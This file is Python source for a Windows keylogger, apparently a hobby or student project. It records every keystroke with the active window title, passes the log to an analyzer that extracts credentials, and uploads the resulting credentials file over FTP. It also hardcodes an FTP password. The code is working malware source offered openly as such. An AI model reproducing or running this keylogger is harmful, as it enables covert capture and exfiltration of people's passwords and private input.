from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
from os import remove, fdopen
import logging
import ftplib
import Analyzer

log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
cred_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\totally_not_credentials.txt'

class Logger:
    def __init__(self, log_file, cred_file):
        self.log_file = log_file
        self.cred_file = cred_file
        logging.basicConfig(filename=(log_file), level=logging.DEBUG,
                            format=( '%(message)s : '))
        self.analyzer = Analyzer.Analyzer(log_file, self.cred_file)
        self.session = ftplib.FTP('127.0.0.1', 'Admin', 'Twinbros1;')
    
    def on_press(self, Key):
        log_str = str(Key) + ' | ' + GetWindowText(GetForegroundWindow())
        if(str(Key) == 'Key.enter'):
            done_analyzing = False
            logging.info(log_str)
            if(not self.analyzer.will_not_parse):
                done_analyzing = self.analyzer.parse_log_file()
            if done_analyzing:
                print("6")
                # send file of credentials thru ftp
                #file_to_send = fdopen(self.cred_file, 'rb')
                file_to_send = open(self.cred_file, 'r')
                print("7")
                self.session.storbinary('STOR example.txt', file_to_send)
                print("8")
                self.session.quit()
                print("9")
                file_to_send.close()
                print("10")
                return False
                print("11")
        else:
            logging.info(log_str)
    
    def log_keys(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()
    
    def cleanup(self):
        logging.shutdown()
        remove(self.log_file)

if __name__ == '__main__':
    # TODO: delete files. need to shutdown logging and make sure everything is closed
    # TODO: watch FH's!!
    logger = Logger(log_file, cred_file)
    logger.log_keys()
